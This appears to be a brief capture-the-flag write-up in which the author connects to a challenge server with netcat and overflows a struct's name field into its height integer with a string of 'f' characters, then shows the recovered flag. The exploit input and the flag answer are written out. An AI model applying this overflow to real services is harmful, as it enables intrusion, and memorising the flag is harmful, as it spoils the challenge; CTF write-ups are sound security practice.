I was going to write a client for this, but then I realized that it was much
easier than I thought. All I had to do was overflow the name into the height,
inside the zombie struct.

So, let's first connect:
nc 104.236.80.67 5684

Then in the name field, we'll overflow it with f's since that is going to max
out the height field. All we need is a name longer than 25 characters plus 4
more to fill up the int.

Zombie name: fffffffffffffffffffffffffffff
Zombie height: 1

Wow. You are a brave warrior. Here is the flag: the_zombies_are_gone
